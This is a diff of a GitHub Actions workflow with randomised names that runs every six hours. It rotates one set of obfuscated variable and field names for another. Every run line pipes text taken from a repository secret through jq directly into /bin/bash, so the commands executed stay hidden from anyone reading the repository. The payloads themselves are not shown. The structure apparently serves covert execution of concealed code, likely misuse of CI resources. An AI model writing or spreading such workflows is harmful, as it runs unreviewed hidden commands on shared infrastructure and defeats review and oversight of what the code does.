@@ -3,29 +3,21 @@ name: anzaidong1887
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 3/6 * * *'
-jobs:  # 17447
+    - cron: '47 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: anzaidong1887
         env:
-          c26486: ${{ secrets.c26486 }}
+          ut26919: ${{ secrets.ut26919 }}
         run: |
-          echo $c26486 | jq -r .z16424 | /bin/bash
-          echo $vq3978 | jq -r .e73023 | /bin/bash
-          echo $p338 | jq -r .kmmc1425 | /bin/bash
-          echo $oqd355 | jq -r .n90 | /bin/bash
-          echo $c624 | jq -r .em7 | /bin/bash
-          echo $nvncf315 | jq -r .cns53 | /bin/bash
-          echo $kj48 | jq -r .btrq0 | /bin/bash
-          echo $msguo72679 | jq -r .y9 | /bin/bash
-          echo $svc8 | jq -r .ri88 | /bin/bash
-          echo $purw07 | jq -r .fp90 | /bin/bash
-          echo $mczzj89 | jq -r .r95 | /bin/bash
-          echo $qlg74 | jq -r .dnvpt9 | /bin/bash
-          echo $dbph803 | jq -r .dfhpn1471 | /bin/bash
-          echo $aif75960 | jq -r .dp2 | /bin/bash
+          echo $ut26919 | jq -r .ia39 | /bin/bash
+          echo $hyom628 | jq -r .zbtc8233 | /bin/bash
+          echo $ik7 | jq -r .sp7026 | /bin/bash
+          echo $yqqbl1586 | jq -r .mspu8 | /bin/bash
+          echo $uqy44969 | jq -r .hirrg704 | /bin/bash
+          echo $ikny0011 | jq -r .nwhut58 | /bin/bash
+          echo $a38 | jq -r .c95 | /bin/bash
 
